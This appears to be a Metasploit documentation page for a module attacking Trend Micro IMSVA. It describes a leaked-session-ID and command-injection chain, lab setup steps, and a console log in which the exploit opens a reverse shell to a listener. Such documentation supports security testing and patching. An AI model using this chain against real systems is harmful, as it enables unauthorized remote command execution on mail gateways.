{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/trendmicro_imsva_widget_exec","result":{"data":{"moduleMetadataJson":{"id":"fa3cffaa-6cd9-5155-a8d3-e78321a7146d","name":"Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution","fullname":"exploit/linux/http/trendmicro_imsva_widget_exec","description":"This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a\n        terminal command under the context of the web server user.\n\n        The specific flaw exists within the management interface, which listens on TCP port 443 by default. Trend Micro IMSVA product\n        have widget feature which is implemented with PHP. Insecurely configured web server exposes diagnostic.log file, which\n        leads to an extraction of JSESSIONID value from administrator session. Proxy.php files under the mod TMCSS folder takes multiple parameter but the process\n        does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities,\n        unauthenticated users can execute a terminal command under the context of the web server user.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/trendmicro_imsva_widget_exec","documentationSlug":"/modules/documentation/exploit/linux/http/trendmicro_imsva_widget_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a terminal command under the context of the web server user.</p>\n<p>The specific flaw exists within the management interface, which listens on TCP port 443 by default. Trend Micro IMSVA product have widget feature which is implemented with PHP. Insecurely configured web server exposes diagnostic.log file, which leads to an extraction of JSESSIONID value from administrator session. Proxy.php files under the mod TMCSS folder takes multiple parameter but the process does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities, unauthenticated users can execute a terminal command under the context of the web server user.</p>\n<p><strong>Vulnerable Application Installation Steps</strong></p>\n<p>IMSVA is distrubed as an ISO image by Trend Micro.</p>\n<p>Following steps are valid on the CentOS 6 x64 bit operating system.</p>\n<ol>\n<li>Open following URL <a href=\"http://downloadcenter.trendmicro.com/\">http://downloadcenter.trendmicro.com/</a></li>\n<li>Find \"InterScan Messaging Security (Virtual Appliance)\" and click.</li>\n<li>At the time of writing this documentation, you must see \"IMSVA-9.1-1600-x86-64-r2.iso\" next to Download button.</li>\n<li>Click to the download button and complete installation of ISO.</li>\n</ol>\n<p>If you don't see a affected version of IMSVA, you can try to download IMSVA-9.1-1600 directly from following URL.</p>\n<p><a href=\"http://files.trendmicro.com/products/imsva/9.1/IMSVA-9.1-1600-x86_64-r2.iso\">http://files.trendmicro.com/products/imsva/9.1/IMSVA-9.1-1600-x86_64-r2.iso</a></p>\n<p><strong>System requirements:</strong></p>\n<ul>\n<li>Virtualbox or VMware can be used. </li>\n<li>4 GB of memory at least.</li>\n<li>120 GB of disk size at least.</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look like this:</p>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Start <code class=\"language-text\">msfconsole</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">use exploit/linux/http/trendmicro_imsva_widget_exec</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set <code class=\"language-text\">RHOST</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set <code class=\"language-text\">LHOST</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Run <code class=\"language-text\">check</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">The target appears to be vulnerable.</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Run <code class=\"language-text\">exploit</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">Awesome. JSESSIONID value</code> in console.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are getting <code class=\"language-text\">Session with widget framework successfully initiated</code> session.</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/trendmicro_imsva_widget_exec\nmsf exploit(trendmicro_imsva_widget_exec) &gt; set RHOST 12.0.0.201\nRHOST =&gt; 12.0.0.184\nmsf exploit(trendmicro_imsva_widget_exec) &gt; check\n[*] 12.0.0.184:443 The target appears to be vulnerable.\nmsf exploit(trendmicro_imsva_widget_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] Extracting JSESSIONID from publicly accessible log file\n[+] Awesome. JSESSIONID value = 0567E974AE729E58178C9B513FEBE41E\n[*] Initiating session with widget framework\n[+] Session with widget framework successfully initiated.\n[*] Trigerring command injection vulnerability\n[*] Command shell session 1 opened (12.0.0.1:4444 -&gt; 12.0.0.201:44103) at 2017-10-08 18:05:11 +0300\n\npwd\n/opt/trend/imss/UI/adminUI/ROOT/widget</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"fa3cffaa-6cd9-5155-a8d3-e78321a7146d"}}}